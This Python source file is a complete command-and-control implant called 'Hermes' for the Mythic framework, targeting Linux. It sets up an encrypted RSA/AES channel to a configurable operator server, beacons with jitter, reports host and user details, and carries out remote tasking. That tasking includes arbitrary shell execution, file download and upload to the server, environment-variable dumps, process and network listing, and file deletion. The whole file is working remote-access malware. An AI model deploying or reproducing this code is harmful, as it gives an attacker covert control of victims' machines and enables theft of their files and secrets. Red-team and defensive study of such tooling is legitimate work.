#!/usr/bin/env python3
"""
Hermes - Mythic C2 Agent (Linux only, Python).
Protocol: EKE (staging_rsa) + AES-256-CBC + HMAC-SHA256.
"""
import json
import base64
import os
import sys
import time
import random
import subprocess
import platform
import socket
import uuid as uuid_mod
from io import BytesIO

# Config injected by builder (will be replaced)
CONFIG_UUID = "CONFIG_UUID"
CONFIG_BASE_URL = "CONFIG_BASE_URL"
CONFIG_POST_URI = "CONFIG_POST_URI"
CONFIG_HEADERS_JSON = "CONFIG_HEADERS_JSON"
CONFIG_INTERVAL = "CONFIG_INTERVAL"
CONFIG_JITTER = "CONFIG_JITTER"
CONFIG_KILLDATE = "CONFIG_KILLDATE"

# Crypto: cryptography (pip install cryptography)
import hashlib
import hmac as hmacc
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

import urllib.request
import urllib.error
import ssl

# Fallback: we'll use urllib for HTTP to avoid hard dependency on requests in minimal env
def _http_post(url, data_bytes, headers_dict, timeout=30):
    req = urllib.request.Request(url, data=data_bytes, method="POST")
    for k, v in (headers_dict or {}).items():
        if k.lower() == "content-length":
            continue
        req.add_header(k, v)
    req.add_header("Content-Length", str(len(data_bytes)))
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            return resp.read()
    except urllib.error.HTTPError as e:
        return e.read() if e.fp else b""
    except Exception:
        return b""


# --- Crypto (compatible Mythic / Poseidon) ---
def pkcs7_pad(data, block_size=16):
    n = block_size - (len(data) % block_size)
    return data + bytes([n] * n)

def pkcs7_unpad(data):
    if not data:
        return data
    n = data[-1]
    if n < 1 or n > 16:
        raise ValueError("invalid pkcs7")
    return data[:-n]

def aes_encrypt(key, plain):
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    padded = padder.update(plain) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    enc = encryptor.update(padded) + encryptor.finalize()
    msg = iv + enc
    sig = hmacc.new(key, msg, hashlib.sha256).digest()
    return msg + sig

def aes_decrypt(key, raw):
    if len(raw) < 16 + 32:
        return b""
    iv = raw[:16]
    sig = raw[-32:]
    body = raw[16:-32]
    check = hmacc.new(key, raw[:-32], hashlib.sha256).digest()
    if not hmacc.compare_digest(sig, check):
        return b""
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    dec = decryptor.update(body) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(dec) + unpadder.finalize()

# RSA for EKE (staging_rsa)
def rsa_keygen():
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    priv = rsa.generate_private_key(public_exponent=65537, key_size=4096, backend=default_backend())
    pub_pem = priv.public_key().public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.PKCS1
    )
    return pub_pem, priv

def rsa_decrypt_oaep(priv, ciphertext):
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
    return priv.decrypt(ciphertext, asym_padding.OAEP(mgf=asym_padding.MGF1(algorithm=hashes.SHA1()), algorithm=hashes.SHA1(), label=None))


# --- Helpers ---
def get_user():
    try:
        return os.environ.get("USER", os.environ.get("LOGNAME", "")) or str(os.getuid())
    except Exception:
        return ""

def get_hostname():
    try:
        return socket.gethostname() or "unknown"
    except Exception:
        return "unknown"

def get_cwd():
    try:
        return os.getcwd()
    except Exception:
        return ""

def get_ips():
    out = []
    try:
        for _, addrs in socket.if_nameindex():
            # stub; on Linux we could parse /proc or use netifaces
            pass
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        out.append(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    if not out:
        out.append("127.0.0.1")
    return out


class HermesAgent:
    def __init__(self):
        self.payload_uuid = CONFIG_UUID
        self.mythic_id = ""  # filled after checkin
        # base_url must end with /, post_uri must not start with /
        self.base_url = CONFIG_BASE_URL.rstrip("/")
        self.post_uri = CONFIG_POST_URI.lstrip("/") if CONFIG_POST_URI.startswith("/") else CONFIG_POST_URI
        self.headers = json.loads(CONFIG_HEADERS_JSON) if CONFIG_HEADERS_JSON else {}
        self.interval = int(CONFIG_INTERVAL)
        self.jitter = int(CONFIG_JITTER)
        self.killdate = CONFIG_KILLDATE  # "YYYY-MM-DD"
        self.aes_key = None
        self._cwd = get_cwd()
        self._running = True

    def _sleep_time(self):
        j = random.randint(0, min(self.jitter, 100)) / 100.0
        return self.interval * (1 - j)

    def _id_bytes(self):
        id_str = self.mythic_id if self.mythic_id else self.payload_uuid
        return (id_str.encode("utf-8") + b"\x00" * 36)[:36]

    def _send(self, body_json_bytes, encrypt=True):
        if encrypt and self.aes_key:
            body_enc = aes_encrypt(self.aes_key, body_json_bytes)
        else:
            body_enc = body_json_bytes
        payload = self._id_bytes() + body_enc
        b64 = base64.b64encode(payload).decode("ascii")
        # Construire l'URL correctement : base_url se termine par /, post_uri ne commence pas par /
        url = self.base_url.rstrip("/") + "/" + self.post_uri.lstrip("/")
        try:
            r = _http_post(url, b64.encode("utf-8"), self.headers)
        except Exception:
            return b""
        if not r:
            return b""
        try:
            raw = base64.b64decode(r.decode("utf-8").strip())
        except Exception:
            return b""
        if len(raw) < 36:
            return b""
        enc = raw[36:]
        if encrypt and self.aes_key:
            dec = aes_decrypt(self.aes_key, enc)
            return dec
        return enc

    def _negotiate_key(self):
        pub_pem, priv = rsa_keygen()
        msg = {
            "action": "staging_rsa",
            "pub_key": base64.b64encode(pub_pem).decode("ascii"),
            "session_id": str(uuid_mod.uuid4()),
        }
        body = json.dumps(msg).encode("utf-8")
        resp = self._send(body, encrypt=False)
        if not resp:
            return False
        try:
            data = json.loads(resp.decode("utf-8"))
        except Exception:
            return False
        session_key_b64 = data.get("session_key") or data.get("SessionKey")
        new_uuid = data.get("uuid") or data.get("UUID") or ""
        if not session_key_b64:
            return False
        key_enc = base64.b64decode(session_key_b64)
        key_dec = rsa_decrypt_oaep(priv, key_enc)
        self.aes_key = key_dec
        if new_uuid:
            self.mythic_id = new_uuid
        return True

    def checkin(self):
        if not self.aes_key and not self._negotiate_key():
            return False
        ips = get_ips()
        msg = {
            "action": "checkin",
            "ips": ips,
            "os": "Linux",
            "user": get_user(),
            "host": get_hostname(),
            "pid": os.getpid(),
            "uuid": self.payload_uuid,
            "architecture": platform.machine() or "x86_64",
            "domain": "",
            "integrity_level": 2,
            "external_ip": ips[0] if ips else "",
            "process_name": "",
            "sleep_info": json.dumps({"interval": self.interval, "jitter": self.jitter, "killdate": self.killdate}),
            "cwd": self._cwd,
        }
        body = json.dumps(msg).encode("utf-8")
        resp = self._send(body)
        if not resp:
            return False
        try:
            data = json.loads(resp.decode("utf-8"))
        except Exception:
            return False
        if data.get("status") == "success" and data.get("id"):
            self.mythic_id = data["id"]
            return True
        return False

    def get_tasking(self, responses):
        # Utiliser -1 pour demander toutes les tâches disponibles (comme Poseidon)
        msg = {
            "action": "get_tasking",
            "tasking_size": -1,
            "responses": responses,
        }
        body = json.dumps(msg, default=str).encode("utf-8")
        resp = self._send(body)
        if not resp:
            return None
        try:
            return json.loads(resp.decode("utf-8"))
        except Exception:
            return None

    def _get_param(self, params, key, default=""):
        """Helper pour extraire un paramètre, même s'il est dans un dict imbriqué"""
        if not isinstance(params, dict):
            return default
        
        value = params.get(key, default)
        
        # Si la valeur est un dict, essayer d'extraire la valeur réelle
        if isinstance(value, dict):
            # Si le dict contient la même clé, prendre cette valeur (récursif)
            if key in value:
                return self._get_param(value, key, default)
            # Sinon, prendre la première valeur string du dict
            for v in value.values():
                if isinstance(v, str) and v:
                    return v
            # Si aucune string trouvée, essayer de convertir le dict en string (pour debug)
            return default
        
        # Si c'est déjà une string, la retourner
        if isinstance(value, str):
            return value
        
        # Si c'est un autre type (int, bool, etc.), le convertir en string
        if value:
            return str(value)
        
        return default
    
    def run_task(self, task):
        task_id = task.get("id", "")
        cmd = task.get("command", "")
        params_str = task.get("parameters", "{}")
        
        # Parsing amélioré des paramètres
        params = {}
        try:
            if isinstance(params_str, str):
                # Si c'est une string, essayer de la parser en JSON
                if params_str.strip():
                    try:
                        params = json.loads(params_str)
                        # Si params contient des valeurs qui sont elles-mêmes des strings JSON, les parser aussi
                        for k, v in params.items():
                            if isinstance(v, str) and v.strip().startswith("{") and v.strip().endswith("}"):
                                try:
                                    params[k] = json.loads(v)
                                except:
                                    pass
                    except json.JSONDecodeError:
                        # Si ce n'est pas du JSON valide, peut-être que c'est une commande shell directe
                        # On garde params vide et on utilisera params_str directement pour shell
                        params = {}
                else:
                    params = {}
            elif isinstance(params_str, dict):
                # Si c'est déjà un dict, l'utiliser directement
                params = params_str.copy()
                # Parser récursivement les valeurs qui sont des strings JSON
                for k, v in params.items():
                    if isinstance(v, str) and v.strip().startswith("{") and v.strip().endswith("}"):
                        try:
                            params[k] = json.loads(v)
                        except:
                            pass
            else:
                params = {}
        except Exception:
            params = {}
        
        out = {"task_id": task_id, "user_output": "", "completed": True, "status": "success"}
        try:
            if cmd == "shell":
                # Essayer plusieurs façons de récupérer la commande
                c = self._get_param(params, "command", "")
                
                # Si params est vide ou si command n'existe pas, essayer params_str directement
                if not c:
                    # Peut-être que la commande est dans params_str directement (pas de JSON)
                    if isinstance(params_str, str) and params_str.strip():
                        # Si params_str ne commence pas par {, c'est probablement la commande directe
                        if not params_str.strip().startswith("{"):
                            c = params_str.strip()
                        else:
                            # C'est du JSON mais le parsing a échoué, essayer quand même
                            try:
                                parsed = json.loads(params_str)
                                c = self._get_param(parsed, "command", "")
                            except:
                                pass
                
                # Vérifier qu'on a une commande valide
                if not c:
                    out["user_output"] = f"Command parameter missing or invalid. Received params={params}, params_str={repr(params_str)}"
                    out["status"] = "error"
                else:
                    # Exécuter la commande
                    r = subprocess.run(["sh", "-c", c], capture_output=True, text=True, timeout=60, cwd=self._cwd or None)
                    out["user_output"] = (r.stdout or "") + (r.stderr and ("\n" + r.stderr) or "")
                    if r.returncode != 0:
                        out["status"] = "error"
            elif cmd == "pwd":
                out["user_output"] = self._cwd or get_cwd()
            elif cmd == "ls":
                path = self._get_param(params, "path", ".")
                if not path or path == "{}":
                    path = "."
                path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                if os.path.isdir(path):
                    # Format lisible comme ls -la
                    try:
                        r = subprocess.run(["ls", "-lah", path], capture_output=True, text=True, timeout=10)
                        if r.returncode == 0:
                            out["user_output"] = r.stdout
                        else:
                            # Fallback: format manuel si ls échoue
                            entries = []
                            for e in sorted(os.listdir(path)):
                                full = os.path.join(path, e)
                                stat = os.stat(full)
                                size = stat.st_size
                                mode = oct(stat.st_mode)[-3:]
                                mtime = time.strftime("%b %d %H:%M", time.localtime(stat.st_mtime))
                                is_file = os.path.isfile(full)
                                entries.append(f"{mode} {size:>8} {mtime} {'d' if not is_file else '-'} {e}")
                            out["user_output"] = "\n".join(entries)
                    except Exception:
                        # Fallback: format JSON si tout échoue
                        entries = []
                        for e in sorted(os.listdir(path)):
                            full = os.path.join(path, e)
                            entries.append({"name": e, "is_file": os.path.isfile(full), "size": os.path.getsize(full) if os.path.isfile(full) else 0})
                        out["user_output"] = json.dumps(entries, indent=2)
                else:
                    out["user_output"] = f"No such directory: {path}"
                    out["status"] = "error"
            elif cmd == "cat":
                path = self._get_param(params, "path", "")
                if not path:
                    out["user_output"] = "Path parameter required"
                    out["status"] = "error"
                else:
                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
                    if os.path.isfile(path):
                        with open(path, "r", errors="replace") as f:
                            out["user_output"] = f.read()
                    else:
                        out["user_output"] = f"File not found: {path}"
                        out["status"] = "error"
            elif cmd == "cd":
                path = self._get_param(params, "path", ".")
                if path == "{}":
                    path = "."
                path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                if os.path.isdir(path):
                    self._cwd = os.path.abspath(path)
                    out["user_output"] = self._cwd
                else:
                    out["user_output"] = f"No such directory: {path}"
                    out["status"] = "error"
            elif cmd == "whoami":
                out["user_output"] = f"user: {get_user()}\nhost: {get_hostname()}"
            elif cmd == "sleep":
                sec_str = self._get_param(params, "seconds", "")
                if sec_str:
                    try:
                        sec = int(sec_str)
                    except ValueError:
                        sec = self.interval
                else:
                    sec = self.interval
                self.interval = int(sec)
                out["user_output"] = f"Sleep interval set to {self.interval}s"
            elif cmd == "exit":
                self._running = False
                out["user_output"] = "Exiting."
            elif cmd == "download":
                path = self._get_param(params, "path", "")
                if not path:
                    out["user_output"] = "Path parameter required"
                    out["status"] = "error"
                else:
                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
                    if os.path.isfile(path):
                        with open(path, "rb") as f:
                            data = f.read()
                        out["user_output"] = base64.b64encode(data).decode("ascii")
                        out["full_path"] = os.path.abspath(path)
                        # Mythic sometimes expects a download block in the response
                        out["download"] = {"full_path": os.path.abspath(path), "contents": base64.b64encode(data).decode("ascii")}
                    else:
                        out["user_output"] = f"File not found: {path}"
                        out["status"] = "error"
            elif cmd == "upload":
                # upload: params have remote_path and file_id (mythic) — agent side often receives content as base64 or file_id
                remote = self._get_param(params, "path", "") or self._get_param(params, "remote_path", "")
                content_b64 = self._get_param(params, "contents", "") or self._get_param(params, "file", "")
                if content_b64 and remote:
                    remote = os.path.join(self._cwd, remote) if not os.path.isabs(remote) else remote
                    try:
                        data = base64.b64decode(content_b64)
                        os.makedirs(os.path.dirname(remote) or ".", exist_ok=True)
                        with open(remote, "wb") as f:
                            f.write(data)
                        out["user_output"] = f"Uploaded to {remote}"
                    except Exception as e:
                        out["user_output"] = str(e)
                        out["status"] = "error"
                else:
                    out["user_output"] = "Missing path or contents"
                    out["status"] = "error"
            elif cmd == "ps":
                r = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=30)
                out["user_output"] = r.stdout or r.stderr or "No output"
            elif cmd == "netstat":
                # Try ss first (modern), fallback to netstat
                r = subprocess.run(["ss", "-tunap"], capture_output=True, text=True, timeout=30)
                if r.returncode != 0:
                    r = subprocess.run(["netstat", "-tunap"], capture_output=True, text=True, timeout=30)
                out["user_output"] = r.stdout or r.stderr or "No output"
            elif cmd == "ifconfig":
                # Try ip first (modern), fallback to ifconfig
                r = subprocess.run(["ip", "addr"], capture_output=True, text=True, timeout=30)
                if r.returncode != 0:
                    r = subprocess.run(["ifconfig"], capture_output=True, text=True, timeout=30)
                out["user_output"] = r.stdout or r.stderr or "No output"
            elif cmd == "env":
                out["user_output"] = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
            elif cmd == "rm":
                path = self._get_param(params, "path", "")
                if not path:
                    out["user_output"] = "Path parameter required"
                    out["status"] = "error"
                else:
                    recursive = params.get("recursive", False)
                    if not isinstance(recursive, bool):
                        recursive = False
                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
                    try:
                        if recursive:
                            import shutil
                            shutil.rmtree(path)
                            out["user_output"] = f"Removed directory: {path}"
                        else:
                            os.remove(path)
                            out["user_output"] = f"Removed: {path}"
                    except Exception as e:
                        out["user_output"] = f"Error removing {path}: {e}"
                        out["status"] = "error"
            elif cmd == "mkdir":
                # Debug: voir ce qui arrive
                path = self._get_param(params, "path", "")
                # Si path est toujours vide ou contient des accolades, essayer de parser params_str directement
                if not path or "{" in str(path):
                    # Peut-être que params_str contient directement le JSON
                    if isinstance(params_str, str) and params_str.strip().startswith("{"):
                        try:
                            parsed = json.loads(params_str)
                            path = self._get_param(parsed, "path", "")
                        except:
                            pass
                    # Si toujours rien, essayer de prendre params_str directement si ce n'est pas du JSON
                    if not path or "{" in str(path):
                        if isinstance(params_str, str) and not params_str.strip().startswith("{"):
                            path = params_str.strip()
                
                # Nettoyer path: enlever les accolades et extraire la valeur si c'est du JSON mal parsé
                if isinstance(path, str) and path.startswith("{") and path.endswith("}"):
                    try:
                        parsed = json.loads(path)
                        path = self._get_param(parsed, "path", "")
                    except:
                        # Si le parsing échoue, essayer d'extraire manuellement
                        import re
                        match = re.search(r'"path"\s*:\s*"([^"]+)"', path)
                        if match:
                            path = match.group(1)
                
                if not path or "{" in str(path):
                    out["user_output"] = f"Path parameter invalid. params={params}, params_str={repr(params_str)}, extracted_path={repr(path)}"
                    out["status"] = "error"
                else:
                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
                    try:
                        os.makedirs(path, exist_ok=True)
                        out["user_output"] = f"Created directory: {path}"
                    except Exception as e:
                        out["user_output"] = f"Error creating directory {path}: {e}"
                        out["status"] = "error"
            elif cmd == "cp":
                src = self._get_param(params, "source", "")
                dst = self._get_param(params, "destination", "")
                if not src or not dst:
                    out["user_output"] = "Source and destination parameters required"
                    out["status"] = "error"
                else:
                    src = os.path.join(self._cwd, src) if src and not os.path.isabs(src) else src
                    dst = os.path.join(self._cwd, dst) if dst and not os.path.isabs(dst) else dst
                    try:
                        import shutil
                        shutil.copy2(src, dst)
                        out["user_output"] = f"Copied {src} to {dst}"
                    except Exception as e:
                        out["user_output"] = f"Error copying {src} to {dst}: {e}"
                        out["status"] = "error"
            elif cmd == "mv":
                src = self._get_param(params, "source", "")
                dst = self._get_param(params, "destination", "")
                if not src or not dst:
                    out["user_output"] = "Source and destination parameters required"
                    out["status"] = "error"
                else:
                    src = os.path.join(self._cwd, src) if src and not os.path.isabs(src) else src
                    dst = os.path.join(self._cwd, dst) if dst and not os.path.isabs(dst) else dst
                    try:
                        import shutil
                        shutil.move(src, dst)
                        out["user_output"] = f"Moved {src} to {dst}"
                    except Exception as e:
                        out["user_output"] = f"Error moving {src} to {dst}: {e}"
                        out["status"] = "error"
            else:
                out["user_output"] = f"Unknown command: {cmd}"
                out["status"] = "error"
        except subprocess.TimeoutExpired:
            out["user_output"] = "Command timed out"
            out["status"] = "error"
        except Exception as e:
            out["user_output"] = str(e)
            out["status"] = "error"
        return out

    def main(self):
        if not self.checkin():
            return
        responses = []
        while self._running:
            if CONFIG_KILLDATE:
                try:
                    from datetime import datetime, timezone
                    kd = datetime.strptime(self.killdate.strip()[:10], "%Y-%m-%d")
                    kd = kd.replace(tzinfo=timezone.utc)
                    if datetime.now(timezone.utc) > kd:
                        return
                except Exception:
                    pass
            data = self.get_tasking(responses)
            responses = []
            if not data:
                time.sleep(self._sleep_time())
                continue
            tasks = data.get("tasks") or []
            for task in tasks:
                resp = self.run_task(task)
                if resp:
                    responses.append(resp)
            time.sleep(self._sleep_time())


if __name__ == "__main__":
    agent = HermesAgent()
    agent.main()
